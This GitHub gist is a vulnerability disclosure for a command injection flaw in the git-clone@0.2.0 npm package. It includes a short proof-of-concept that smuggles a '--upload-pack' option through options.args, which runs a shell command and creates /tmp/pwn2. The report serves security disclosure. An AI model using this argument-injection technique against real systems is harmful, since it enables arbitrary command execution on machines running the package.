
[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Flirantal%2F9441f3a1212728476f7a6caa4acb2ccc)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Flirantal%2F9441f3a1212728476f7a6caa4acb2ccc&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Flirantal%2F9441f3a1212728476f7a6caa4acb2ccc) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Flirantal%2F9441f3a1212728476f7a6caa4acb2ccc&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@lirantal](https://avatars.githubusercontent.com/u/316371?s=64&v=4)](/lirantal)

# [lirantal](/lirantal)/**[git-clone-command-injection.md](/lirantal/9441f3a1212728476f7a6caa4acb2ccc)** Secret

Created
March 27, 2022 06:37

Show Gist options

* [Download ZIP](/lirantal/9441f3a1212728476f7a6caa4acb2ccc/archive/e59cde7336f9ea5d27a0d0ce1a8b17a79ee6baf7.zip)

* [Star
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Flirantal%2F9441f3a1212728476f7a6caa4acb2ccc)You must be signed in to star a gist
* [Fork
  (0)
  0](/login?return_to=https%3A%2F%2Fgist.github.com%2Flirantal%2F9441f3a1212728476f7a6caa4acb2ccc)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/lirantal/9441f3a1212728476f7a6caa4acb2ccc.js&quot;&gt;&lt;/script&gt;
* Save lirantal/9441f3a1212728476f7a6caa4acb2ccc to your computer and use it in GitHub Desktop.

[Code](/lirantal/9441f3a1212728476f7a6caa4acb2ccc)
[Revisions
1](/lirantal/9441f3a1212728476f7a6caa4acb2ccc/revisions)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/lirantal/9441f3a1212728476f7a6caa4acb2ccc.js&quot;&gt;&lt;/script&gt;

Save lirantal/9441f3a1212728476f7a6caa4acb2ccc to your computer and use it in GitHub Desktop.

[Download ZIP](/lirantal/9441f3a1212728476f7a6caa4acb2ccc/archive/e59cde7336f9ea5d27a0d0ce1a8b17a79ee6baf7.zip)

Command Injection vulnerability in git-clone@0.2.0

 [Raw](/lirantal/9441f3a1212728476f7a6caa4acb2ccc/raw/e59cde7336f9ea5d27a0d0ce1a8b17a79ee6baf7/git-clone-command-injection.md)

[**git-clone-command-injection.md**](#file-git-clone-command-injection-md)

# Command Injection vulnerability in git-clone@0.2.0

`git-clone` describes itself as a tool to clone a git repository

Resources:

* Project's GitHub source code: <https://github.com/jaz303/git-clone>
* Project's npm package: <https://www.npmjs.com/package/git-clone>

`git-clone` receives about 230,000 downloads a week so this report should probably be timely.

## Background on exploitation

I'm reporting a Command Injection vulnerability in `git-clone` npm package.

A use of the `--upload-pack` feature of git is also supported for `git clone`, and allows users to execute arbitrary commands on the OS.

The source code attempted to mitigate user input concatenation as shown here: <https://github.com/jaz303/git-clone/blob/master/private/util.js#L16-L17> with the following:

```
	args = args.concat(userArgs);
	args.push('--', repo, targetPath);
```

However, the user arguments are first added to the command being executed, and only then the double dash is added. Effectively, creating the following array values passed to the `git` spawned command here <https://github.com/jaz303/git-clone/blob/46e27e0a60261f22ff70ed5f29d72f5d43b8aeab/private/impl.js#L10>:

```
[
  'clone',
  '--upload-pack=touch /tmp/pwn2',
  '--',
  'file:///tmp/zero12345',
  '/tmp/example-new-repo'
]

```

If a user controls the options object provided to the `clone()` function through the `options.args` array, then they can inject commands to run when the clone function is called.

## New exploit

Install `git-clone@0.2.0`, which is the latest.

Run the following code:

```
const clone = require('git-clone')
const repo = 'file:///tmp/zero12345'
const path = '/tmp/example-new-repo'
const options = {
	args: [
	'--upload-pack=touch /tmp/pwn2'
]}
clone(repo, path, options)
```

Observe a new file created: `/tmp/pwn2`

# Author

Liran Tal

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2Flirantal%2F9441f3a1212728476f7a6caa4acb2ccc)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

